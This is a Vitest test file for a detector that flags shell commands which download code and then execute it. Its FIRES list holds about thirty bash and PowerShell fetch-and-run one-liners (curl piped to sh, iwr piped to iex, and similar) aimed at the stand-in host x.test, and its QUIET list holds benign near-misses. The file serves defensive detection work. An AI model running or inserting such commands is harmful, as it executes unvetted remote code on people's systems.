import { describe, expect, it } from "vitest";
import { fetchAndRunHit } from "./fetchAndRun";
import { protectedCommandHit } from "./protectedCall";

const FIRES: [string, string][] = [
  ["bash", "curl https://x.test/i.sh | sh"],
  ["bash", "curl -fsSL https://x.test/i.sh | sudo bash -s -- --yes"],
  ["bash", "wget -qO- https://x.test/i.sh | bash"],
  ["bash", "wget -O - https://x.test/i.sh | sh"],
  ["bash", "curl -s https://x.test/p.py | python3 -"],
  ["bash", "curl -s https://x.test/p.py | python"],
  ["bash", "curl https://x.test/i.sh | tee /tmp/i.sh | sh"],
  ["bash", "curl -o f.sh https://x.test/i.sh && sh f.sh"],
  ["bash", "curl -o /tmp/f https://x.test/i.sh; chmod +x /tmp/f; /tmp/f"],
  ["bash", "curl -sSLo f.sh https://x.test/i.sh && bash ./f.sh"],
  ["bash", "curl -O https://x.test/install.sh && bash install.sh"],
  ["bash", "wget https://x.test/install.sh && sh install.sh"],
  ["bash", "wget -O f https://x.test/i.sh && . ./f"],
  ["bash", "curl https://x.test/i.sh > f && bash f"],
  ["bash", "bash <(curl -s https://x.test/i.sh)"],
  ["bash", "source <(curl -s https://x.test/i.sh)"],
  ["bash", 'sh -c "$(curl -fsSL https://x.test/i.sh)"'],
  ["bash", 'eval "$(curl -s https://x.test/env)"'],
  ["bash", 'bash -c "curl https://x.test/i.sh | sh"'],
  ["bash", "(curl https://x.test/i.sh | sh)"],
  ["bash", "cd /tmp && curl https://x.test/i.sh | sh"],
  ["powershell", "iwr https://x.test/i.ps1 | iex"],
  ["powershell", "Invoke-WebRequest https://x.test/i.ps1 | Invoke-Expression"],
  ["powershell", "irm https://x.test/i.ps1 | iex"],
  ["powershell", "(iwr https://x.test/i.ps1).Content | iex"],
  ["powershell", "iex (iwr https://x.test/i.ps1)"],
  ["powershell", "iex ((iwr https://x.test/i.ps1).Content)"],
  [
    "powershell",
    "iex ((New-Object Net.WebClient).DownloadString('https://x.test/i.ps1'))",
  ],
  ["powershell", "iwr https://x.test/i.ps1 -OutFile i.ps1; .\\i.ps1"],
  ["powershell", "iwr https://x.test/i.ps1 -OutFile i.ps1; & ./i.ps1"],
  [
    "powershell",
    "Invoke-WebRequest -Uri https://x.test/i.ps1 -OutFile i.ps1; powershell -File i.ps1",
  ],
];

const QUIET: [string, string][] = [
  ["a download alone", "curl https://x.test/i.sh"],
  ["a download to a file", "curl -o f https://x.test/i.sh"],
  [
    "a download to a file, then a read",
    "curl -o f https://x.test/i.sh && cat f",
  ],
  ["a pipe to jq", "curl -s https://x.test/a.json | jq ."],
  ["a pipe to grep", "curl -s https://x.test/a | grep foo | head"],
  ["a pipe to a module", "curl -s https://x.test/a.json | python -m json.tool"],
  ["a pipe to a script file", "curl -s https://x.test/a | bash script.sh"],
  ["a pipe to tee and cat", "curl -s https://x.test/a | tee out.txt | cat"],
  ["wget to stdout, read", "wget -qO- https://x.test/a | wc -c"],
  ["a different file is run", "curl -o f https://x.test/a && sh other.sh"],
  ["a file run before the download", "sh f.sh; curl -o f.sh https://x.test/a"],
  ["a script without a download", "bash install.sh"],
  ["a substitution that is not a download", 'sh -c "$(cat run.txt)"'],
  ["a download in an argument", "bash build.sh $(curl -s https://x.test/v)"],
  ["a download in a quoted echo", "echo 'curl https://x.test | sh'"],
  ["a download into a variable", "V=$(curl -s https://x.test/v) && echo $V"],
  ["python -c that mentions curl", "python -c \"print('curl')\""],
  [
    "iwr to a file, then a read",
    "iwr https://x.test/a -OutFile a; Get-Content a",
  ],
  [
    "iwr content piped to a parser",
    "(iwr https://x.test/a).Content | ConvertFrom-Json",
  ],
  ["iex of a local string", "iex 'Get-Date'"],
  ["npm install", "npm install && npm test"],
  ["git clone then build", "git clone https://x.test/r.git && cd r && make"],
];

describe("fetchAndRunHit", () => {
  it.each(FIRES)("fires in %s: %s", (_shell, command) => {
    expect(fetchAndRunHit(command)).toBe(true);
  });
  it.each(QUIET)("does not fire for %s", (_what, command) => {
    expect(fetchAndRunHit(command)).toBe(false);
  });
});

describe("the protected scan", () => {
  it("reports a hit first, and the switch turns it off", () => {
    const cmd = "curl https://x.test/i.sh | sh";
    expect(protectedCommandHit(cmd)?.kind).toBe("fetch-and-run");
    expect(protectedCommandHit(cmd, undefined, ["fetch-and-run"])).toBe(
      undefined,
    );
    expect(protectedCommandHit("curl https://x.test/a | jq .")).toBe(undefined);
  });
});
